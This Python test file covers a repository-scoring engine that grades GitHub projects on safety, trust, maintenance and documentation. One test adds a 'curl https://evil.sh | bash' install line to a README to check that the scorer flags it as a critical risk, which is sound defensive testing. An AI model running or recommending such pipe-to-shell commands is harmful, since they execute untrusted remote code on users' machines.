"""Tests for the RepoPilot Score engine. Run: python3 tests/test_score.py"""
import os
import sys
from datetime import datetime, timezone, timedelta

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from repopilot.score import compute_score, WEIGHTS  # noqa: E402
from repopilot.tools import RepoSnapshot  # noqa: E402


def _iso(days_ago):
    return (datetime.now(timezone.utc) - timedelta(days=days_ago)).isoformat()


def _mature_clean():
    return RepoSnapshot(
        name="flask",
        file_paths=["pyproject.toml", "src/flask/__init__.py", "tests/test_app.py", ".env.example"],
        readme_text="x" * 2000,
        manifests={"pyproject.toml": 'python = ">=3.11"'},
        meta={"created_at": _iso(1800), "pushed_at": _iso(10), "stargazers": 65000,
              "forks": 16000, "open_issues": 20, "archived": False,
              "license": "BSD-3-Clause", "owner": "pallets", "owner_type": "Organization"},
    )


def test_weights_sum_to_one():
    assert abs(sum(WEIGHTS.values()) - 1.0) < 1e-9


def test_mature_clean_repo_scores_A():
    r = compute_score(_mature_clean())
    assert r["grade"] in ("A", "B")
    assert r["overall"] >= 75
    assert r["capped_by_critical"] is False
    assert any(d["name"] == "Safety" and d["score"] == 100 for d in r["dimensions"])


def test_curl_bash_caps_to_risky():
    snap = _mature_clean()
    snap.readme_text += "\nInstall: `curl https://evil.sh | bash`"
    r = compute_score(snap)
    assert r["capped_by_critical"] is True
    assert r["overall"] <= 45
    assert r["grade"] in ("D", "F")
    assert any(c["severity"] == "CRITICAL" for c in r["critical_issues"])


def test_fake_stars_tank_trust():
    snap = RepoSnapshot(
        name="too-good", file_paths=["README.md"], readme_text="x" * 400,
        meta={"created_at": _iso(20), "pushed_at": _iso(5), "stargazers": 40000,
              "forks": 10, "open_issues": 0, "archived": False, "license": "MIT",
              "owner": "rando", "owner_type": "User"},
    )
    r = compute_score(snap)
    trust = next(d["score"] for d in r["dimensions"] if d["name"] == "Trust")
    assert trust < 60
    assert any("star" in c["issue"].lower() for c in r["critical_issues"])


def test_archived_hits_maintenance():
    snap = _mature_clean()
    snap.meta["archived"] = True
    r = compute_score(snap)
    maint = next(d["score"] for d in r["dimensions"] if d["name"] == "Maintenance")
    assert maint < 60


def test_no_license_thin_readme_hurts_docs():
    snap = RepoSnapshot(name="bare", file_paths=["main.py"], readme_text="hi",
                        meta={"created_at": _iso(400), "pushed_at": _iso(30),
                              "stargazers": 5, "license": "", "owner_type": "User"})
    r = compute_score(snap)
    docs = next(d["score"] for d in r["dimensions"] if d["name"] == "Documentation")
    assert docs < 40
    assert any("license" in f["label"].lower() for f in r["factors"]["negative"])


def test_result_shape_is_complete():
    r = compute_score(_mature_clean())
    for key in ("overall", "grade", "label", "verdict", "dimensions", "factors", "critical_issues"):
        assert key in r
    assert len(r["dimensions"]) == 5
    assert "positive" in r["factors"] and "negative" in r["factors"]


# ---- username vs repo parsing (dual mode) ----
def test_parse_username_vs_repo():
    from repopilot.github import parse_username, parse_repo_url
    assert parse_username("torvalds") == "torvalds"
    assert parse_username("@torvalds") == "torvalds"
    assert parse_username("https://github.com/torvalds") == "torvalds"
    assert parse_username("pallets/flask") is None          # a repo, not a user
    assert parse_repo_url("pallets/flask") == ("pallets", "flask")
    assert parse_repo_url("torvalds") is None                # a user, not a repo


if __name__ == "__main__":
    passed = failed = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn(); passed += 1; print(f"PASS {name}")
            except AssertionError as e:
                failed += 1; print(f"FAIL {name}: {e}")
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
